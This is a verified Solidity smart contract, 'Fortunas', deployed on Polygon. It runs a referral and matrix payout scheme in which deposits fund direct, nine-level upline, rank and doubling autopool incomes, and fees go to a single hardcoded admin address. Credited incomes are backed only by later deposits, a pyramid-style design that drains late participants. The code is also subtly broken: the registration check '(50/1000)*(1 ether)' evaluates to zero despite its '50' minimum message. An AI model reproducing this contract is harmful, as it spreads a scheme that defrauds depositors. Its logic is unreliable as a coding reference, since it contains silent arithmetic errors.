/**
 *Submitted for verification at polygonscan.com on 2022-11-23
*/

//SPDX-License-Identifier: None
pragma solidity ^0.6.0;

contract Fortunas {
    struct User {
        uint id;
        address referrer;
        uint256 entry_time;
        uint partnersCount;
        uint256 maxDeposit;
        uint8 rank;
        bool isPoolActive;
        mapping(uint8 => AutoPool) autoMatrix;       
    }    
    struct AutoPool {
        address currentReferrer;
        address[] firstLevelReferrals;
        address[] secondLevelReferrals;
    }
    struct RoyaltyInfo{
        uint256 directincome;
        uint256 levelincome;
        uint256 autopoolincome;
        uint256 reward;
        uint256 totalincome;        
        uint256 totalwithdraw;
    }
    mapping(address => User) public users;
    mapping(address=>RoyaltyInfo) public royaltyInfo;
    
    mapping(uint => address) public idToAddress;
    mapping(uint256=>address[]) public rewardUser;
    uint public lastUserId = 2;
    address public id1;
    
    mapping(uint8 => uint) public autoPoolIncome;
    mapping(uint8 => uint) public rewardIncome;
    mapping(uint8 => uint) public rewardDirect;

    mapping(uint8 => mapping(uint256 => address)) public x6vId_number;
    mapping(uint8 => uint256) public x6CurrentvId;
    mapping(uint8 => uint256) public x6Index;
    uint256 private constant directPercents = 25;
    uint256[9] private levelPercents = [10,5,4,3,2,1,5,5,10];
	
    address adminWallet=0x61004C6bb0758408CCA971258bd6B12677aB2B6f;
    address communityDevelopmentWallet=0x61004C6bb0758408CCA971258bd6B12677aB2B6f;
    address deductionWallet=0x61004C6bb0758408CCA971258bd6B12677aB2B6f;
    
    event Registration(address indexed user, address indexed referrer, uint indexed userId, uint referrerId);
    event Upgrade(address indexed user, uint256 level);
    event NewUserPlace(address indexed user, address indexed referrer, uint8 matrix, uint8 level, uint8 place);
    event Transaction(address indexed user,address indexed from,uint256 value, uint8 level,uint8 Type);
    event withdraw(address indexed user,uint256 value);
    
    constructor() public {
        autoPoolIncome[1] = 50e18;
        for (uint8 i = 2; i <= 20; i++) {
            autoPoolIncome[i] = autoPoolIncome[i-1] * 2; 
        }
        id1 = msg.sender;
        rewardIncome[1]=50e18;
        rewardIncome[2]=25e18;
        rewardIncome[3]=50e18;
        rewardIncome[4]=125e18;
        rewardDirect[1]=10;
        rewardDirect[2]=25;
        rewardDirect[3]=50;
        rewardDirect[4]=100;
        User memory user = User({
            id: 1,
            referrer: address(0),
            entry_time:block.timestamp,
            partnersCount: uint(0),
            isPoolActive:true,
            maxDeposit:0,
            rank:0
        });
        users[id1] = user;
        idToAddress[1] = id1;
        for (uint8 i = 1; i <= 20; i++) { 
            x6vId_number[i][1]=id1;
            x6Index[i]=1;
            x6CurrentvId[i]=1;         
        } 
    }
    function registrationExt(address referrerAddress) external payable {
        require(msg.value==((50/1000)*(1 ether)), "Minimum invest amount is 50!");
        registration(msg.sender, referrerAddress,msg.value);
    }
    
    function buyNewLevel() external payable { 
        uint256 _amount=msg.value;
        uint256 _lastamount=users[msg.sender].maxDeposit;
        require(_amount==_lastamount*2, "Minimum invest amount is 50!");
        require(isUserExists(msg.sender), "user is not exists. Register first."); 
        _deposit(msg.sender, _amount);
        emit Upgrade(msg.sender,_amount);
    }
    function registration(address userAddress, address referrerAddress,uint256 _amount) private {
        require(!isUserExists(userAddress), "user exists");
        require(isUserExists(referrerAddress), "referrer not exists");

        User memory user = User({
            id: lastUserId,
            referrer: referrerAddress,
            entry_time:block.timestamp,
            partnersCount: 0,
            isPoolActive:false,
            maxDeposit:0,
            rank:0
        });
        
        users[userAddress] = user;
        idToAddress[lastUserId] = userAddress;
        users[userAddress].referrer = referrerAddress;

        lastUserId++;
        users[referrerAddress].partnersCount++;

        manageReward(referrerAddress);

        _deposit(msg.sender, _amount);
        if(users[referrerAddress].partnersCount>2 && !users[referrerAddress].isPoolActive)
        {
           address freeAutoPoolReferrer = findFreeG6Referrer(1);
           users[referrerAddress].autoMatrix[1].currentReferrer = freeAutoPoolReferrer;
           updateAutoPoolReferrer(referrerAddress, freeAutoPoolReferrer, 1);
           users[referrerAddress].isPoolActive=true;
        }
        emit Registration(userAddress, referrerAddress, users[userAddress].id, users[referrerAddress].id);
    }
    function manageReward(address _user) private {
        uint8 rank=users[_user].rank;
        uint8 nextrank=rank+1;
        if(users[_user].partnersCount>=rewardDirect[nextrank])
        {
            users[_user].rank=nextrank;
            royaltyInfo[_user].reward+=rewardIncome[nextrank];
            royaltyInfo[_user].totalincome+=rewardIncome[nextrank];
            emit Transaction(_user,id1,rewardIncome[nextrank],1,4);  
        }
    }
    function _deposit(address _user, uint256 _amount) private {     
        if(users[_user].maxDeposit == 0){
            users[_user].maxDeposit = _amount;
        }else if(users[_user].maxDeposit < _amount){
            users[_user].maxDeposit = _amount;
        }
        _distributeDeposit(_amount);
        royaltyInfo[users[_user].referrer].directincome += _amount*directPercents/100;                       
        royaltyInfo[users[_user].referrer].totalincome +=_amount*directPercents/100;
        emit Transaction(users[_user].referrer,_user,_amount*directPercents/100,1,1);
        _distributelevelIncome(users[_user].referrer, _amount);       
    } 
    function _distributeDeposit(uint256 _amount) private {
        uint256 _adminFee = _amount*10/100;
        payable(adminWallet).transfer(_adminFee);
        uint256 _communityDevelopmentFee = _amount*10/100;
        payable(communityDevelopmentWallet).transfer(_communityDevelopmentFee);        
    }
    function _distributelevelIncome(address _user, uint256 _amount) private {
        address upline = users[_user].referrer;
        for(uint8 i = 0; i < 9; i++){
            if(upline != address(0)){
                uint256 reward=_amount*levelPercents[i]/100; 
                royaltyInfo[upline].levelincome += reward;                       
                royaltyInfo[upline].totalincome +=reward;   
                emit Transaction(upline,_user,reward,(i+2),2);                        
                upline = users[upline].referrer;
            }else{
                break;
            }
        }
    }
    
    function findFreeG6Referrer(uint8 level) public view returns(address){
            uint256 id=x6CurrentvId[level];
            return x6vId_number[level][id];
    } 
    function usersautoMatrix(address userAddress, uint8 level) public view returns(address, address[] memory, address[] memory) {
        return (users[userAddress].autoMatrix[level].currentReferrer,
                users[userAddress].autoMatrix[level].firstLevelReferrals,
                users[userAddress].autoMatrix[level].secondLevelReferrals);
    }    
    function isUserExists(address user) public view returns (bool) {
        return (users[user].id != 0);
    }
    
    function updateAutoPoolReferrer(address userAddress, address referrerAddress, uint8 level) private{
        uint256 newIndex=x6Index[level]+1;
        x6vId_number[level][newIndex]=userAddress;
        x6Index[level]=newIndex;
        users[referrerAddress].autoMatrix[level].firstLevelReferrals.push(userAddress);        
        if (users[referrerAddress].autoMatrix[level].firstLevelReferrals.length < 2) {
            emit NewUserPlace(userAddress, referrerAddress, 2, level, uint8(users[referrerAddress].autoMatrix[level].firstLevelReferrals.length));
            if (referrerAddress == id1) {
                return;
            }
            address ref = users[referrerAddress].autoMatrix[level].currentReferrer;            
            users[ref].autoMatrix[level].secondLevelReferrals.push(userAddress);
            emit NewUserPlace(userAddress, ref, 2, level, 2 + uint8(users[ref].autoMatrix[level].secondLevelReferrals.length));
            return;
            
        }
        emit NewUserPlace(userAddress, referrerAddress, 2, level, 2);
        x6CurrentvId[level]=x6CurrentvId[level]+1;
        if (referrerAddress == id1) {
            return;
        }
        address ref = users[referrerAddress].autoMatrix[level].currentReferrer;            
        users[ref].autoMatrix[level].secondLevelReferrals.push(userAddress);
        if (users[ref].autoMatrix[level].secondLevelReferrals.length < 4) {
            emit NewUserPlace(userAddress, ref, 2, level, 2+uint8(users[ref].autoMatrix[level].secondLevelReferrals.length));
            return;
        }
        emit NewUserPlace(userAddress, ref, 2, level, 6);
        emit Transaction(ref,userAddress,autoPoolIncome[level],1,3);
        royaltyInfo[ref].autopoolincome += autoPoolIncome[level];                       
        royaltyInfo[ref].totalincome +=autoPoolIncome[level];
        ++level;
		if(level<20 && ref!=id1){ 
            address freeReferrerAddress = findFreeG6Referrer(level);
            if (users[ref].autoMatrix[level].currentReferrer != freeReferrerAddress) {
                users[ref].autoMatrix[level].currentReferrer = freeReferrerAddress;
            }
            updateAutoPoolReferrer(ref, freeReferrerAddress, level);
		}
    } 
    function rewardWithdraw() public
    {
        uint balanceReward = royaltyInfo[msg.sender].totalincome - royaltyInfo[msg.sender].totalwithdraw;        
        royaltyInfo[msg.sender].totalwithdraw+=balanceReward;
        (msg.sender).transfer(balanceReward*90/100);  
        payable(deductionWallet).transfer(balanceReward*10/100);  
    }
}